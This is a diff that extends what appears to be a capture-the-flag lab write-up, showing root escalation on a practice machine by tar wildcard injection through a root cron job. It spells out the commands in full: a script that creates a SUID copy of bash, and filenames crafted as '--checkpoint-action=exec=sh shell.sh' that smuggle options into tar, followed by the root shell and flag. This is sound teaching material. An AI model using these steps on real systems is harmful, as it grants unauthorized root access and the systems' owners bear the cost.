@@ -248,4 +248,101 @@ The user.txt file was found right when I logged in
 THM{96dc7bd50d2fb98fcece01560788b5ab}
 user.txt found!
 
+It's time to find out how to get access to root now 
+Lets first identify ourselves 
 
+id 
+uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)
+
+Let's see if we can find any root jobs that are writable scripts 
+
+ls -la /etc/cron.d/ 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
+total 32
+drwxr-xr-x   2 root root  4096 May  9  2026 .
+drwxr-xr-x 109 root root 12288 Nov 20 16:02 ..
+-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
+-rw-r--r--   1 root root   201 Feb 14  2020 e2scrub_all
+-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
+-rw-r--r--   1 root root   194 May  9  2026 voltlabs-backup
+30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
+10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
+# The first element of the path is a directory where the debian-sa1
+# script is located
+PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Activity reports every 10 minutes everyday
+5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1
+
+# Additional run at 23:59 to rotate the statistics file
+59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
+# Volt Labs staging backup - runs as root
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
+
+That last result there is our target 
+* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
+* * * * * → runs every minute
+
+Let's ensure that I can write to /opt/backups 
+
+ls -la /opt/backups/
+total 12
+drwxrwx--- 2 webdev webdev 4096 May  9  2026 .
+drwxr-xr-x 4 root   root   4096 May  9  2026 ..
+-rw-r--r-- 1 webdev webdev   12 May  9  2026 .keep
+
+touch /opt/backups/test && echo "writable" && rm /opt/backups/test
+writable
+
+That "writable" is our golden sign. This file is writable and exploitable
+
+Why the * is the whole vulnerability
+The * is a shell glob (wildcard). Before tar ever runs, the shell expands * into a list of every filename in the current directory.
+So if /opt/backups contains files named a.txt, b.txt, shell.sh, the shell rewrites the command to:
+
+tar czf /var/backups/uploads.tgz a.txt b.txt shell.sh
+
+Let's write the attack 
+
+cd /opt/backups/
+webdev@coldstart:/opt/backups$ ls 
+webdev@coldstart:/opt/backups$ echo 'cp /bin/bash /tmp/rootbash && chmod 4777 /tmp/rootbash' > shell.sh
+webdev@coldstart:/opt/backups$ chmod +x shell.sh 
+webdev@coldstart:/opt/backups$ touch -- '--checkpoint=1'
+webdev@coldstart:/opt/backups$ touch -- '--checkpoint-action=exec=sh shell.sh'
+webdev@coldstart:/opt/backups$ ls -la 
+total 16
+-rw-rw-r-- 1 webdev webdev    0 Nov 20 16:12 '--checkpoint-action=exec=sh shell.sh'
+-rw-rw-r-- 1 webdev webdev    0 Nov 20 16:12 '--checkpoint=1'
+drwxrwx--- 2 webdev webdev 4096 Nov 20 16:12  .
+drwxr-xr-x 4 root   root   4096 May  9  2026  ..
+-rw-r--r-- 1 webdev webdev   12 May  9  2026  .keep
+-rwxrwxr-x 1 webdev webdev   55 Nov 20 16:11  shell.sh
+
+What each tar option does
+--checkpoint=1 → tar normally prints a “checkpoint” progress message periodically during archiving. 
+Setting it to 1 means “hit a checkpoint after every 1 record processed” basically, trigger a checkpoint almost immediately.
+--checkpoint-action=exec=sh shell.sh → this is tar’s genuinely dangerous feature: it lets you run a command at each checkpoint.
+exec=sh shell.sh means “when you hit a checkpoint, run sh shell.sh.”
+
+Put together: tar starts archiving, hits a checkpoint after 1 record, and executes sh shell.sh as root,
+because the whole tar process is running as root from the cron job.
+
+To check and verify our file was created 
+s -la /tmp/rootbash
+-rwsrwxrwx 1 root root 1446024 Nov 20 16:15 /tmp/rootbash
+
+Lets execute 
+/tmp/rootbash -p
+rootbash-5.2# id 
+uid=1001(webdev) gid=1001(webdev) euid=0(root) groups=1001(webdev)
+We are now Root!
+Lets find that flag.txt file 
+cd ~root 
+ls 
+flag.txt  snap
+There it is flag.txt
+THM{e6ee84a483d67ade06936fcfd1433e8a}
+flag.txt found!
